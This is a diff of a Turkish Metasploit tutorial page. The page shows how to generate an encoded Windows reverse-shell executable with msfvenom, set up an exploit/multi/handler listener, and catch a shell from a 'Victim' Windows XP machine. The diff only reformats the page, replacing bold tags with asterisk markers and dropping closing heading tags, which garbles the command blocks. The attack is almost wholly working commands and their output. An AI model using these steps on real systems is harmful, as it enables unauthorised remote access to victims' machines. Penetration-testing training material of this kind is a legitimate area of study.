@@ -52,7 +52,7 @@ url: /tr/msf-binary-payloads/
  
 
  
-<h2 class="wp-block-heading" id="windows-reverse-shell-açan-payload-oluşturma">Windows Reverse Shell Açan Payload Oluşturma</h2>
+<h2 class="wp-block-heading" id="windows-reverse-shell-açan-payload-oluşturma">Windows Reverse Shell Açan Payload Oluşturma
 <!-- /wp:heading -->
 
   Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için&nbsp;<code>windows/shell/reverse_tcp</code>&nbsp;modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım. 
@@ -60,7 +60,7 @@ url: /tr/msf-binary-payloads/
 
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
-Options <strong>for </strong>payload/windows/shell/reverse_tcp:
+Options ***for *** payload/windows/shell/reverse_tcp:
 
 
        Name: Windows Command Shell, Reverse TCP Stager
@@ -80,12 +80,12 @@ Provided by:
 Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
-EXITFUNC  process          yes       Exit technique <strong>(</strong>Accepted: '', seh, thread, process, none<strong>)</strong>
+EXITFUNC  process          yes       Exit technique ***(*** Accepted: '', seh, thread, process, none***)*** 
 LHOST                      yes       The listen address
 LPORT     4444             yes       The listen port
 
 Description:
-  Spawn a piped command shell <strong>(</strong>staged<strong>)</strong>. Connect back to the attacker
+  Spawn a piped command shell ***(*** staged***)*** . Connect back to the attacker
 </code></pre>
 <!-- /wp:code -->
 
@@ -93,10 +93,10 @@ Description:
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST<strong>=</strong>172.16.104.130 LPORT<strong>=</strong>31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST***=*** 172.16.104.130 LPORT***=*** 31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 <strong>(</strong>iteration<strong>=</strong>0<strong>)</strong>
+x86/shikata_ga_nai succeeded with size 326 ***(*** iteration***=*** 0***)*** 
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: /tmp/1.exe
@@ -108,12 +108,12 @@ Saved as: /tmp/1.exe
 
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# file /tmp/1.exe
-/tmp/1.exe: PE32 executable <strong>(</strong>GUI<strong>)</strong> Intel 80386, <strong>for </strong>MS Windows
+/tmp/1.exe: PE32 executable ***(*** GUI***)***  Intel 80386, ***for *** MS Windows
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="dinleme-ayarları">Dinleme Ayarları</h2>
+<h2 class="wp-block-heading" id="dinleme-ayarları">Dinleme Ayarları
 <!-- /wp:heading -->
 
   Elimizde istemcinin tıklayıp çalıştıracağı&nbsp;<code>1.exe</code>&nbsp;dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü ve içinde&nbsp;<code>payload windows/shell/reverse_tcp</code>&nbsp;dinleyici payload u kullanacağız. 
@@ -123,8 +123,8 @@ Saved as: /tmp/1.exe
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use exploit/multi/handler
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use exploit/multi/handler
+msf exploit***(*** handler***)***  ***&gt;***  show options
 
 Module options:
 
@@ -144,9 +144,9 @@ Exploit target:
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set payload windows/shell/reverse_tcp
-payload <strong>=&gt;</strong> windows/shell/reverse_tcp
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  set payload windows/shell/reverse_tcp
+payload ***=&gt;***  windows/shell/reverse_tcp
+msf exploit***(*** handler***)***  ***&gt;***  show options
 
 Module options:
 
@@ -154,7 +154,7 @@ Module options:
    ----  ---------------  --------  -----------
 
 
-Payload options <strong>(</strong>windows/shell/reverse_tcp<strong>)</strong>:
+Payload options ***(*** windows/shell/reverse_tcp***)*** :
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
@@ -184,11 +184,11 @@ Exploit target:
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LHOST 172.16.104.130
-LHOST <strong>=&gt;</strong> 172.16.104.130
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LPORT 31337
-LPORT <strong>=&gt;</strong> 31337
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  set LHOST 172.16.104.130
+LHOST ***=&gt;***  172.16.104.130
+msf exploit***(*** handler***)***  ***&gt;***  set LPORT 31337
+LPORT ***=&gt;***  31337
+msf exploit***(*** handler***)***  ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -196,16 +196,16 @@ msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> exploit
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>474 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Command shell session 2 opened <strong>(</strong>172.16.104.130:31337 -&gt; 172.16.104.128:1150<strong>)</strong>
+***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
+***[*** ******* ***]***  Started reverse handler
+***[*** ******* ***]***  Starting the payload handler...
+***[*** ******* ***]***  Sending stage ***(*** 474 bytes***)*** 
+***[*** ******* ***]***  Command shell session 2 opened ***(*** 172.16.104.130:31337 -&gt; 172.16.104.128:1150***)*** 
 
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
 
 C:\Documents and Settings\Victim\My Documents&gt;</code></pre>
 <!-- /wp:code -->
